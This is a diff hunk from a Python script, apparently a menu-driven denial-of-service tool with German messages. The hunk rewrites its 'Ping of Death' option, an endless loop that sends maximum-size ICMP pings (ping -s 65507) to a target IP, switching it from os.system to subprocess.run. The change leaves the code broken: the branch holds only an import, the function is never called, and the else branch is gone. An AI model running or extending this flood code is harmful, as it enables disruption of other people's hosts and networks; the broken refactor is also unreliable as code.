@@ -58,16 +58,12 @@ elif method == "2":
 
 elif method == "3":
     # POD Flood
-    def ping_of_death(ip):
-        print("Starte Ping of Death...")
-        try:
-            while True:
-                os.system(f"ping -s 65507 {ip}")  # Maximale Paketgröße für ICMP
-        except KeyboardInterrupt:
-            print("Ping of Death beendet.")
+    import subprocess
 
-    ping_of_death(ip)
-
-else:
-    print("Ungültige Auswahl. Das Programm wird beendet.")
-
+def ping_of_death(ip):
+    print("Starte Ping of Death...")
+    try:
+        while True:
+            subprocess.run(["ping", "-s", "65507", ip], check=True)
+    except KeyboardInterrupt:
+        print("Ping of Death beendet.")
